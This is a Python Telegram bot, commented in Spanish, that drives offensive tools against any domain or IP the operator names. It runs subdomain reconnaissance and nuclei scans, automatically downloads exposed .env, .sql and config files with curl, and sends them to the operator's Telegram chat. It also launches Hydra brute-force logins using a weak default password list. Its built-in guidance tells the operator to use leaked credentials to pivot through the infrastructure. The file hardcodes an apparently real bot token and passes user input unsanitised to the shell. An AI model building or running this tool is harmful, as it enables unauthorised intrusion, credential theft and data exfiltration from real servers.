import telebot
from telebot import types
import subprocess
import os
import time
import re

# --- CONFIGURACIÓN ---
TOKEN = "8760818918:AAEPZfrcH5L5qVLHymarv0e-IfljRfyb9rY"
YOUR_CHAT_ID = "6280594821"

bot = telebot.TeleBot(TOKEN)

# --- DETECTOR DE RUTA PARA HYDRA CLONADO (hydra.sh) ---
def obtener_comando_hydra():
    # 1. Intenta ver si está instalado globalmente
    check = subprocess.run("command -v hydra", shell=True, capture_output=True)
    if check.returncode == 0:
        return "hydra"
    
    # 2. Busca el script local hydra.sh en la carpeta hermana
    ruta_script = os.path.abspath(os.path.join(os.getcwd(), "..", "hydra", "hydra.sh"))
    
    if os.path.exists(ruta_script):
        # Asegura permisos de ejecución
        subprocess.run(f"chmod +x {ruta_script}", shell=True)
        # Retornamos el comando precedido por bash para asegurar su ejecución
        return f"bash {ruta_script}"
        
    return None

# --- MOTOR DE ANÁLISIS E IMPACTO ---
def analizar_y_explicar(archivo_reporte):
    impacto = "🔵 **ANÁLISIS DE IMPACTO**\n"
    instrucciones = "👉 **GUÍA DE ACCIÓN:**\n"
    
    with open(archivo_reporte, "r") as f:
        content = f.read().lower()

    if any(x in content for x in ["critical", "high", ".env", "config", "password", "aws_"]):
        impacto += "⚠️ **Nivel: CRÍTICO / ALTO**\nSe detectaron fugas de credenciales o archivos críticos."
        instrucciones += "1. Analiza los archivos descargados; contienen accesos directos.\n2. Usa estos datos para pivotar en la infraestructura."
    elif any(x in content for x in ["200", "medium", "backup", ".sql", ".log"]):
        impacto += "⚠️ **Nivel: MEDIO**\nSe encontraron rutas expuestas, respaldos o logs."
        instrucciones += "1. Revisa los logs en busca de nombres de usuario.\n2. Intenta un ataque de fuerza bruta con `/fuerza`."
    else:
        impacto += "ℹ️ **Nivel: INFORMACIÓN**\nSolo se detectó información técnica."
        instrucciones += "1. Úsala para perfilar el servidor objetivo."
    
    return impacto, instrucciones

# --- FUNCIÓN DE AUTO-EXFILTRACIÓN ---
def descargar_filtracion(url, chat_id):
    try:
        clean_url = url.strip()
        file_name = "exfil_" + clean_url.split("/")[-1].split(" ")[0].replace(":", "_").replace("?", "_")
        if not file_name or len(file_name) < 5: 
            file_name = f"exfil_data_{int(time.time())}.txt"

        subprocess.run(f"curl -s -k -L {clean_url} -o {file_name}", shell=True)
        
        if os.path.exists(file_name) and os.path.getsize(file_name) > 10:
            with open(file_name, "rb") as f:
                bot.send_document(chat_id, f, caption=f"📥 **Archivo exfiltrado:**\n`{clean_url}`", parse_mode="Markdown")
            os.remove(file_name)
    except Exception as e:
        print(f"Error en exfiltración: {e}")

# --- MENÚ PRINCIPAL ---
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        help_text = (
            "🤖 **Bugtin Bot v8.7 - Hydra.sh Mode**\n\n"
            "📡 `/subs` - Recon de subdominios.\n"
            "🔓 `/archivos` - Escaneo y exfiltración automática.\n"
            "⚡ `/fuerza` - Ataque vía `hydra.sh`.\n\n"
            "🚀 *Estado: Configurado para usar script local.*"
        )
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📡 Solo Subdominios", "🔓 Buscar Archivos Expuestos")
        markup.add("⚡ Ataque de Fuerza Bruta")
        bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode="Markdown")

# --- LÓGICA: RECONOCIMIENTO ---
@bot.message_handler(commands=['subs'])
def start_subs(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        msg = bot.send_message(message.chat.id, "🎯 **Escribe el dominio objetivo (ej: google.com):**")
        bot.register_next_step_handler(msg, process_subdomains_step)

def process_subdomains_step(message):
    target = message.text.strip().lower()
    chat_id = message.chat.id
    bot.send_message(chat_id, f"🚀 Extrayendo subdominios de `{target}`...")
    output = "total_subs.txt"
    subprocess.run("rm -f s1.txt s2.txt total_subs.txt", shell=True)
    try:
        subprocess.run(f"subfinder -d {target} -o s1.txt -silent", shell=True)
        if os.path.exists("common.txt"):
            subprocess.run(f"gobuster dns --domain {target} --wordlist common.txt --quiet --output s2.txt", shell=True)
        
        subprocess.run(f"cat s1.txt s2.txt > {output} 2>/dev/null", shell=True)
        subprocess.run(f"sort -u {output} -o {output}", shell=True)
        
        if os.path.exists(output) and os.path.getsize(output) > 0:
            with open(output, "rb") as f:
                bot.send_document(chat_id, f, caption=f"🏁 Reconocimiento: {target}")
            os.remove(output)
        else:
            bot.send_message(chat_id, "❌ No se encontraron resultados.")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")

# --- LÓGICA: AUDITORÍA Y EXFILTRACIÓN ---
@bot.message_handler(commands=['archivos'])
def start_archivos(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        msg = bot.send_message(message.chat.id, "🎯 **Introduce la URL o Subdominio:**")
        bot.register_next_step_handler(msg, process_vulns_step)

def process_vulns_step(message):
    target = message.text.strip().lower()
    chat_id = message.chat.id
    report_file = f"rep_{target.replace('/', '_')}.txt"
    bot.send_message(chat_id, f"🔍 Auditando `{target}`...\n\nBuscando filtraciones automáticamente.", parse_mode="Markdown")
    try:
        subprocess.run(f"nuclei -u {target} -tags exposure,cve,config,panel -o {report_file} -silent", shell=True)
        
        if os.path.exists(report_file) and os.path.getsize(report_file) > 0:
            imp, gui = analizar_y_explicar(report_file)
            bot.send_message(chat_id, f"{imp}\n\n{gui}", parse_mode="Markdown")
            
            with open(report_file, "r") as f:
                for line in f:
                    if "http" in line and any(ext in line for ext in [".env", ".sql", ".log", ".json", ".conf", ".bak", ".old", ".yaml"]):
                        match = re.search(r'https?://[^\s\[\]\(\)]+', line)
                        if match:
                            descargar_filtracion(match.group(0), chat_id)
            
            with open(report_file, "rb") as doc:
                bot.send_document(chat_id, doc, caption=f"📄 Reporte de auditoría: {target}")
            os.remove(report_file)
        else:
            bot.send_message(chat_id, f"✅ No se detectaron vulnerabilidades en `{target}`.")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")

# --- LÓGICA: FUERZA BRUTA (Hydra Clonado) ---
@bot.message_handler(commands=['fuerza'])
def start_fuerza(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        msg = bot.send_message(message.chat.id, "⚔️ **Ataque Hydra**\n\nFormato: `IP Servicio Usuario` \nEj: `1.1.1.1 ssh root`", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_fuerza_step)

def process_fuerza_step(message):
    try:
        comando_base = obtener_comando_hydra()
        
        if not comando_base:
            bot.send_message(message.chat.id, "❌ **Hydra no encontrado.**\nAsegúrate de que el archivo `hydra.sh` esté en `../hydra/hydra.sh`.")
            return

        data = message.text.split()
        if len(data) < 3:
            bot.send_message(message.chat.id, "❌ Formato: `IP Servicio Usuario` (ej: 10.0.0.1 ftp admin)")
            return
        
        ip, servicio, user = data[0], data[1], data[2]
        chat_id = message.chat.id
        pass_list = "passwords.txt"
        res_file = "hydra_res.txt"
        
        if not os.path.exists(pass_list):
            with open(pass_list, "w") as f: f.write("admin\n123456\npassword\nroot\n12345")

        bot.send_message(chat_id, f"⚡ Atacando `{ip}` usando `{comando_base}`...")
        
        # Ejecutamos el ataque
        subprocess.run(f"{comando_base} -l {user} -P {pass_list} -t 4 -f {ip} {servicio} -o {res_file}", shell=True)
        
        if os.path.exists(res_file) and os.path.getsize(res_file) > 0:
            with open(res_file, "r") as f:
                bot.send_message(chat_id, f"🎯 **¡ACCESO OBTENIDO!**\n\n`{f.read()}`", parse_mode="Markdown")
            os.remove(res_file)
        else:
            bot.send_message(chat_id, f"❌ No se encontró la contraseña para el usuario `{user}`.")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Error: {str(e)}")

# --- BOTONES ---
@bot.message_handler(func=lambda m: m.text == "📡 Solo Subdominios")
def btn_subs(m): start_subs(m)
@bot.message_handler(func=lambda m: m.text == "🔓 Buscar Archivos Expuestos")
def btn_arch(m): start_archivos(m)
@bot.message_handler(func=lambda m: m.text == "⚡ Ataque de Fuerza Bruta")
def btn_fuerza(m): start_fuerza(m)

print("🚀 Bugtin Bot v8.7 Online. Usando hydra.sh para fuerza bruta.")
bot.polling()
